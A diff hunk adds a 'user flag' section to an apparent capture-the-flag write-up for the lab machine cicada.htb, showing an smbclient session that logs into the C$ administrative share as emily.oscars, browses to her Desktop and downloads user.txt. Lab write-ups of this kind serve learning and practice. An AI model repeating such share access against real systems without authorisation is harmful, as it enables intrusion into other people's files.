@@ -558,3 +558,83 @@ $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileNa
 Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
 Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
 ```
+
+user flag:
+```bash
+└──╼ [★]$ smbclient -U emily.oscars@cicada.htb \\\\cicada.htb\\C$
+Password for [emily.oscars@cicada.htb]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $Recycle.Bin                      DHS        0  Thu Mar 14 08:24:03 2024
+  $WinREAgent                        DH        0  Mon Sep 23 11:16:49 2024
+  Documents and Settings          DHSrn        0  Thu Mar 14 14:40:47 2024
+  DumpStack.log.tmp                 AHS    12288  Fri Dec  6 03:26:33 2024
+  pagefile.sys                      AHS 738197504  Fri Dec  6 03:26:33 2024
+  PerfLogs                            D        0  Thu Aug 22 13:45:54 2024
+  Program Files                      DR        0  Thu Aug 29 14:32:50 2024
+  Program Files (x86)                 D        0  Sat May  8 04:40:21 2021
+  ProgramData                       DHn        0  Fri Aug 30 12:32:07 2024
+  Recovery                         DHSn        0  Thu Mar 14 14:41:18 2024
+  Shares                              D        0  Thu Mar 14 07:21:29 2024
+  System Volume Information         DHS        0  Thu Mar 14 06:18:00 2024
+  Users                              DR        0  Mon Aug 26 15:11:25 2024
+  Windows                             D        0  Mon Sep 23 11:35:40 2024
+
+		4168447 blocks of size 4096. 428008 blocks available
+smb: \> cd Users
+smb: \Users\> ls
+  .                                  DR        0  Mon Aug 26 15:11:25 2024
+  ..                                DHS        0  Mon Sep 23 11:52:48 2024
+  Administrator                       D        0  Mon Aug 26 15:10:38 2024
+  All Users                       DHSrn        0  Sat May  8 03:34:03 2021
+  Default                           DHR        0  Thu Mar 14 14:40:47 2024
+  Default User                    DHSrn        0  Sat May  8 03:34:03 2021
+  desktop.ini                       AHS      174  Sat May  8 03:18:31 2021
+  emily.oscars.CICADA                 D        0  Thu Aug 22 16:22:13 2024
+  Public                             DR        0  Thu Mar 14 05:45:15 2024
+
+		4168447 blocks of size 4096. 428008 blocks available
+smb: \Users\> cd emily.oscars.CICADA
+smb: \Users\emily.oscars.CICADA\> ls
+  .                                   D        0  Thu Aug 22 16:22:13 2024
+  ..                                 DR        0  Mon Aug 26 15:11:25 2024
+  AppData                            DH        0  Thu Aug 22 16:22:13 2024
+  Application Data                DHSrn        0  Thu Aug 22 16:22:13 2024
+  Cookies                         DHSrn        0  Thu Aug 22 16:22:13 2024
+  Desktop                            DR        0  Wed Aug 28 12:32:18 2024
+  Documents                          DR        0  Thu Aug 22 16:22:13 2024
+  Downloads                          DR        0  Sat May  8 03:20:24 2021
+  Favorites                          DR        0  Sat May  8 03:20:24 2021
+  Links                              DR        0  Sat May  8 03:20:24 2021
+  Local Settings                  DHSrn        0  Thu Aug 22 16:22:13 2024
+  Music                              DR        0  Sat May  8 03:20:24 2021
+  My Documents                    DHSrn        0  Thu Aug 22 16:22:13 2024
+  NetHood                         DHSrn        0  Thu Aug 22 16:22:13 2024
+  NTUSER.DAT                        AHn   262144  Thu Aug 22 16:28:26 2024
+  ntuser.dat.LOG1                   AHS    20480  Thu Aug 22 16:22:12 2024
+  ntuser.dat.LOG2                   AHS        0  Thu Aug 22 16:22:12 2024
+  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Thu Aug 22 16:24:27 2024
+  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Thu Aug 22 16:22:12 2024
+  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Thu Aug 22 16:22:12 2024
+  ntuser.ini                         HS       20  Thu Aug 22 16:22:13 2024
+  Pictures                           DR        0  Sat May  8 03:20:24 2021
+  PrintHood                       DHSrn        0  Thu Aug 22 16:22:13 2024
+  Recent                          DHSrn        0  Thu Aug 22 16:22:13 2024
+  Saved Games                        Dn        0  Sat May  8 03:20:24 2021
+  SendTo                          DHSrn        0  Thu Aug 22 16:22:13 2024
+  Start Menu                      DHSrn        0  Thu Aug 22 16:22:13 2024
+  Templates                       DHSrn        0  Thu Aug 22 16:22:13 2024
+  Videos                             DR        0  Sat May  8 03:20:24 2021
+
+		4168447 blocks of size 4096. 428008 blocks available
+smb: \Users\emily.oscars.CICADA\> cd Desktop
+smb: \Users\emily.oscars.CICADA\Desktop\> ls
+  .                                  DR        0  Wed Aug 28 12:32:18 2024
+  ..                                  D        0  Thu Aug 22 16:22:13 2024
+  user.txt                           AR       34  Fri Dec  6 03:27:37 2024
+
+		4168447 blocks of size 4096. 428007 blocks available
+smb: \Users\emily.oscars.CICADA\Desktop\> get user.txt
+getting file \Users\emily.oscars.CICADA\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
+
+```
